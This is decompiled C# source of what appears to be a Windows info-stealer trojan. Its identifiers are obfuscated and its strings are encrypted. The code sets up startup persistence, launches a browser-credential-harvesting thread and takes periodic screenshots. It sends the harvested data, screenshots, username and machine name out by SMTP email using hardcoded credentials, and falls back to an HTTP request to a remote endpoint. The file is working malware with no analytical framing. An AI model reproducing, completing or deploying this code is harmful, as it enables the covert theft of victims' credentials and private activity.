using System;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Net;
using System.Net.Mail;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using Microsoft.VisualBasic.FileIO;
using My;

public class CMFVPTXI
{
	public static string PFWIPPTS;

	public static string RTHONOHK;

	public static string JYNOMBKE;

	public static string QEFKDPRL;

	public static string LJRGCWCM;

	public static string STUGM;

	public static string VUKMJ;

	public static string GUONQ;

	public static string DSHCH;

	public static string YIQJJ;

	public static string GRPPC;

	public static string IGGLP;

	public static string CEGKP;

	public static string QWGXVLMT = "";

	public static string KUYHFRBJ = VKFIKEPD.FRNFYMBL("qMTBz82iutPS0nq8zcjCpoPD1sYM", "False");

	public static string OCOFYXYV = VKFIKEPD.FRNFYMBL("pcrSy8KtycHVigw=", "False");

	public static string RDDHKOII = VKFIKEPD.FRNFYMBL("scbY24ulxsXUyWy809gM", "False");

	public static int UIKKVKSQ = 587;

	public static string KXQNGOSL = VKFIKEPD.FRNFYMBL("DLEXSite", "False");

	public static string WHRWHJBI = VKFIKEPD.FRNFYMBL("rNPe4Z1zjgQ=", "False");

	public static string YTOPHNUV = VKFIKEPD.FRNFYMBL("BA==", "False");

	public static string DOKCLRMK = VKFIKEPD.FRNFYMBL("iNDb39R9fpnoknOOoqiTcwQ=", "False");

	public static string XYPNPDFH = VKFIKEPD.FRNFYMBL("nMnZ1tO804vFybfW1NXJuIDO4dmxxIvg07mA1+HFqYC4xad4kpm2sJGOiwQ=", "False");

	public static string BELOOTCK = VKFIKEPD.FRNFYMBL("mtPh2AQ=", "False");

	public static string CIPNPIWT = VKFIKEPD.FRNFYMBL("bKK4xqog", "False");

	public static int OLSECGTX = 120000;

	public static string JRTBUMFP = "";

	public static string WXQBQYBX = "";

	public static int number = 0;

	public static UNLNGPMR YJMKRFLO;

	public static Thread JWMFRSPT = new Thread(QSBLKHYU);

	public static Thread GCThread = new Thread(DAChrome.GTCHRME);

	public static Thread EUFXCCUK = new Thread(RLSHJLXD);

	public static Thread STRTTHRD = new Thread(DAStartup.Startupdll.StartPers);

	[STAThread]
	public static void Main()
	{
		int num = default(int);
		try
		{
			IntPtr intPtr2 = (Process.GetCurrentProcess().MinWorkingSet = new IntPtr(5));
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex, num);
			ProjectData.ClearProjectError();
		}
		try
		{
			if (!Directory.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + VKFIKEPD.FRNFYMBL("eoatrq+NrLOxsXp7pa6ok6m3pyw=", "False")))
			{
				Directory.CreateDirectory(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + VKFIKEPD.FRNFYMBL("eoatrq+NrLOxsXp7pa6ok6m3pyw=", "False"));
			}
			if (!Directory.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + VKFIKEPD.FRNFYMBL("kZ3Excakw8rIyJGTzce4mr7Py7Whw7cU", "False")))
			{
				Directory.CreateDirectory(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + VKFIKEPD.FRNFYMBL("kZ3Excakw8rIyJGTzce4mr7Py7Whw7cU", "False"));
			}
		}
		catch (Exception ex2)
		{
			ProjectData.SetProjectError(ex2, num);
			ProjectData.ClearProjectError();
		}
		try
		{
			foreach (string file in ((ServerComputer)MyProject.Computer).get_FileSystem().GetFiles(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + VKFIKEPD.FRNFYMBL("kZ3Excakw8rIyJGTzce4mr7Py7Whw7cU", "False"), (SearchOption)3, new string[1] { "*.png*" }))
			{
				File.Delete(file);
			}
			foreach (string file2 in ((ServerComputer)MyProject.Computer).get_FileSystem().GetFiles(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + VKFIKEPD.FRNFYMBL("l6PKy8yqydDOzpeYwsvFsMbUxA8=", "False")))
			{
				File.Delete(file2);
			}
		}
		catch (Exception ex3)
		{
			ProjectData.SetProjectError(ex3, num);
			ProjectData.ClearProjectError();
		}
		try
		{
			STRTTHRD.IsBackground = true;
			STRTTHRD.Start();
		}
		catch (Exception ex4)
		{
			ProjectData.SetProjectError(ex4, num);
			ProjectData.ClearProjectError();
		}
		int num2 = 0;
		while (true)
		{
			num = 1;
			try
			{
				if (num2 == 3)
				{
					Application.Restart();
				}
				YJMKRFLO = new UNLNGPMR(WXQBQYBX);
				UNLNGPMR.WJIIENGP();
			}
			catch (Exception ex5)
			{
				ProjectData.SetProjectError(ex5, num);
				num2 = checked(num2 + 1);
				ProjectData.ClearProjectError();
				continue;
			}
			break;
		}
		try
		{
			JWMFRSPT.IsBackground = true;
			JWMFRSPT.Start();
		}
		catch (Exception ex6)
		{
			ProjectData.SetProjectError(ex6, num);
			ProjectData.ClearProjectError();
		}
		try
		{
			GCThread.IsBackground = true;
			GCThread.Start();
		}
		catch (Exception ex7)
		{
			ProjectData.SetProjectError(ex7, num);
			ProjectData.ClearProjectError();
		}
		try
		{
			EUFXCCUK.IsBackground = true;
			EUFXCCUK.Start();
		}
		catch (Exception ex8)
		{
			ProjectData.SetProjectError(ex8, num);
			ProjectData.ClearProjectError();
		}
		Process.GetCurrentProcess().WaitForExit();
	}

	public static void CIOUBCOI(ref double GMSTKWSD)
	{
		try
		{
			DateTime t = DateAndTime.get_Now().AddSeconds(GMSTKWSD);
			while (DateTime.Compare(DateAndTime.get_Now(), t) < 0)
			{
				Application.DoEvents();
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public static void QSBLKHYU()
	{
		//IL_00ff: Unknown result type (might be due to invalid IL or missing references)
		//IL_0106: Expected O, but got Unknown
		string text = "";
		checked
		{
			while (true)
			{
				Thread.Sleep(OLSECGTX);
				text = "";
				string text2 = "";
				double GMSTKWSD = 0.2;
				CIOUBCOI(ref GMSTKWSD);
				try
				{
					WebClient webClient = new WebClient();
					text2 = VKFIKEPD.FRNFYMBL("mJSgp5l6laCnmXqVoKeZepWgp5l6laCnmXqVoKeZepWgp5l6laCnmXqVoKeZepWgp5l6laCnmXqVoKeZepWhxw0=", "False") + Environment.NewLine + Environment.NewLine + webClient.DownloadString(VKFIKEPD.FRNFYMBL("osnU15NphMHczanCwdvCqcOO3sGbycnaxrO+0JW8qcKP1Ylzh5OXkm6KjsjMqg0=", "False")) + Environment.NewLine + Environment.NewLine + VKFIKEPD.FRNFYMBL("enaCiXtcd4KJe1x3gol7XHeCiXtcd4KJe1x3gol7XHeCiXtcd4KJe1x3gol7XHeCiXtcd4KJe1x3gol7XHeDqSs=", "False");
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					text2 = "";
					ProjectData.ClearProjectError();
				}
				GMSTKWSD = 1.0;
				CIOUBCOI(ref GMSTKWSD);
				try
				{
					if (Operators.CompareString(BELOOTCK, VKFIKEPD.FRNFYMBL("mNHf1gY=", "False"), false) == 0)
					{
						Rectangle bounds = Screen.get_PrimaryScreen().get_Bounds();
						Bitmap val = new Bitmap(bounds.Width, bounds.Height, (PixelFormat)2498570);
						Graphics val2 = Graphics.FromImage((Image)(object)val);
						val2.CopyFromScreen(bounds.X, bounds.Y, 0, 0, bounds.Size, (CopyPixelOperation)13369376);
						Bitmap val3 = val;
						((Image)val3).Save(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + VKFIKEPD.FRNFYMBL("j5vCw8SiwcjGxo+Ry8W2mLzNybOfwbXTtaWzvs4X", "False") + number + VKFIKEPD.FRNFYMBL("ZsPMzBI=", "False"));
					}
				}
				catch (Exception projectError2)
				{
					ProjectData.SetProjectError(projectError2);
					ProjectData.ClearProjectError();
				}
				GMSTKWSD = 0.3;
				CIOUBCOI(ref GMSTKWSD);
				try
				{
					if (Operators.CompareString(WXQBQYBX, "", false) != 0)
					{
						JRTBUMFP = VKFIKEPD.FRNFYMBL("fHiEi31eeYSLfV55hIt9XnmEi31eeYSLfV55hIt9XnmEi31eeYSLYG2rrsFgXnmEi31eeYSLfV55hIt9XnmEi31eeYSLfV55hIt9XnmEi31eeYWrKQ==", "False") + Environment.NewLine + Environment.NewLine + WXQBQYBX + Environment.NewLine + Environment.NewLine + text2 + Environment.NewLine + Environment.NewLine + text;
						try
						{
							MailMessage mailMessage = new MailMessage();
							MailMessage mailMessage2 = mailMessage;
							mailMessage2.From = new MailAddress(KUYHFRBJ);
							mailMessage2.To.Add(KUYHFRBJ);
							mailMessage2.Subject = VKFIKEPD.FRNFYMBL("cKi3ureQpL3EY3CusXGJlq63i2Mi", "False") + Environment.UserName.ToString() + VKFIKEPD.FRNFYMBL("aQ0=", "False") + Environment.MachineName.ToString();
							mailMessage2.Body = JRTBUMFP;
							try
							{
								if (Operators.CompareString(BELOOTCK, VKFIKEPD.FRNFYMBL("mNHf1gY=", "False"), false) == 0)
								{
									Attachment item = new Attachment(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + VKFIKEPD.FRNFYMBL("j5vCw8SiwcjGxo+Ry8W2mLzNybOfwbXTtaWzvs4X", "False") + number + VKFIKEPD.FRNFYMBL("ZsPMzBI=", "False"));
									mailMessage2.Attachments.Add(item);
								}
							}
							catch (Exception projectError3)
							{
								ProjectData.SetProjectError(projectError3);
								ProjectData.ClearProjectError();
							}
							mailMessage2 = null;
							SmtpClient smtpClient = new SmtpClient(RDDHKOII);
							SmtpClient smtpClient2 = smtpClient;
							smtpClient2.Port = UIKKVKSQ;
							smtpClient2.EnableSsl = true;
							smtpClient2.Credentials = new NetworkCredential(KUYHFRBJ, OCOFYXYV);
							smtpClient2.Send(mailMessage);
							smtpClient2 = null;
						}
						catch (Exception projectError4)
						{
							ProjectData.SetProjectError(projectError4);
							try
							{
								string text3 = VKFIKEPD.FRNFYMBL("hKu2uXVLZq6yqIWrrq6uj6SjsqdKarHAp0qasbZqaKCvsq+InLW8gImYq7VpjJ+yLQ==", "False");
								_ = (HttpWebResponse)WebRequest.Create(text3 + "?to=" + KUYHFRBJ + "&subject=" + Strings.Replace(VKFIKEPD.FRNFYMBL("cKi3ureQpL3EY3CusXGJlq63i2Mi", "False") + Environment.UserName.ToString() + VKFIKEPD.FRNFYMBL("aQ0=", "False") + Environment.MachineName.ToString(), " ", "%20", 1, -1, (CompareMethod)0) + "&message=" + Strings.Replace(JRTBUMFP, " ", "%20", 1, -1, (CompareMethod)0) + "&from=" + KUYHFRBJ).GetResponse();
							}
							catch (Exception projectError5)
							{
								ProjectData.SetProjectError(projectError5);
								ProjectData.ClearProjectError();
							}
							ProjectData.ClearProjectError();
						}
					}
				}
				catch (Exception projectError6)
				{
					ProjectData.SetProjectError(projectError6);
					ProjectData.ClearProjectError();
				}
				JRTBUMFP = "";
				WXQBQYBX = "";
				QWGXVLMT = "";
				number++;
			}
		}
	}

	public static void RLSHJLXD()
	{
		_ = Directory.GetFiles(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + VKFIKEPD.FRNFYMBL("eoatrq+NrLOxsXp7pa6ok6m3pyw=", VKFIKEPD.FRNFYMBL("g7nP3cEJ", "False"))).Length;
		DirectoryInfo directoryInfo = new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + VKFIKEPD.FRNFYMBL("eoatrq+NrLOxsXp7pa6ok6m3pyw=", VKFIKEPD.FRNFYMBL("g7nP3cEJ", "False")));
		FileInfo[] files = directoryInfo.GetFiles();
		try
		{
			double GMSTKWSD = 25.0;
			CIOUBCOI(ref GMSTKWSD);
			string text = VKFIKEPD.FRNFYMBL("lZGdpJZ3kp2klneSnaSWd5KdpJZ3kp2klneSnaSWd5KdpJZ3kp2klneSnaSWd5KdpJZ3krPbvpvBxdnMd5KdpJZ3kp2klneSnaSWd5KdpJZ3kp2klneSnaSWd5KdpJZ3kp2klneSnaSWd5KdpJZ4sg4=", "False") + Environment.NewLine + Environment.NewLine + PFWIPPTS + Environment.NewLine + Environment.NewLine + RTHONOHK + Environment.NewLine + Environment.NewLine + JYNOMBKE + Environment.NewLine + Environment.NewLine + QEFKDPRL + Environment.NewLine + Environment.NewLine + LJRGCWCM + Environment.NewLine + Environment.NewLine + STUGM + Environment.NewLine + Environment.NewLine + VUKMJ + Environment.NewLine + Environment.NewLine + GUONQ + Environment.NewLine + Environment.NewLine + YIQJJ + Environment.NewLine + Environment.NewLine + GRPPC + Environment.NewLine + Environment.NewLine + IGGLP + Environment.NewLine + Environment.NewLine + CEGKP + Environment.NewLine + Environment.NewLine + VKFIKEPD.FRNFYMBL("Z4KNlIZngo2UhmeCjZSGZ4KNlIZngo2UhmeCjZSGZ4KNlIZngo2UhmeCjZSGZ4KNlIZngo2UhmeCjZSGZ4KNlIZngo2UhmeCjZSGZ4KNlIZngo2UhmeCjZSGZ4KNlIZngo2UhmeCjZSGZ4KNlIZngo2UhmeCjZSGZ4KNlIZngo0f", "False");
			try
			{
				MailMessage mailMessage = new MailMessage();
				MailMessage mailMessage2 = mailMessage;
				mailMessage2.From = new MailAddress(KUYHFRBJ);
				mailMessage2.To.Add(KUYHFRBJ);
				mailMessage2.Subject = VKFIKEPD.FRNFYMBL("YpqprKmClq+2VWmloaShe6OvY3uIoKl9VTA=", "False") + Environment.UserName.ToString() + VKFIKEPD.FRNFYMBL("aQ0=", VKFIKEPD.FRNFYMBL("g7nP3cEJ", "False")) + Environment.MachineName.ToString();
				mailMessage2.Body = text;
				try
				{
					FileInfo[] array = files;
					foreach (FileInfo fileInfo in array)
					{
						Attachment item = new Attachment(fileInfo.FullName);
						mailMessage2.Attachments.Add(item);
					}
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					ProjectData.ClearProjectError();
				}
				mailMessage2 = null;
				SmtpClient smtpClient = new SmtpClient(RDDHKOII);
				SmtpClient smtpClient2 = smtpClient;
				smtpClient2.Port = UIKKVKSQ;
				smtpClient2.EnableSsl = true;
				smtpClient2.Credentials = new NetworkCredential(KUYHFRBJ, OCOFYXYV);
				smtpClient2.Send(mailMessage);
				smtpClient2 = null;
			}
			catch (Exception projectError2)
			{
				ProjectData.SetProjectError(projectError2);
				try
				{
					string text2 = VKFIKEPD.FRNFYMBL("hKu2uXVLZq6yqIWrrq6uj6SjsqdKarHAp0qasbZqaKCvsq+InLW8gImYq7VpjJ+yLQ==", "False");
					_ = (HttpWebResponse)WebRequest.Create(text2 + "?to=" + KUYHFRBJ + "&subject=" + Strings.Replace(VKFIKEPD.FRNFYMBL("YpqprKmClq+2VWmloaShe6OvY3uIoKl9VTA=", "False") + Environment.UserName.ToString() + VKFIKEPD.FRNFYMBL("aQ0=", VKFIKEPD.FRNFYMBL("g7nP3cEJ", "False")) + Environment.MachineName.ToString(), " ", "%20", 1, -1, (CompareMethod)0) + "&message=" + Strings.Replace(text, " ", "%20", 1, -1, (CompareMethod)0) + "&from=" + KUYHFRBJ).GetResponse();
				}
				catch (Exception projectError3)
				{
					ProjectData.SetProjectError(projectError3);
					ProjectData.ClearProjectError();
				}
				ProjectData.ClearProjectError();
			}
		}
		catch (Exception projectError4)
		{
			ProjectData.SetProjectError(projectError4);
			ProjectData.ClearProjectError();
		}
	}
}
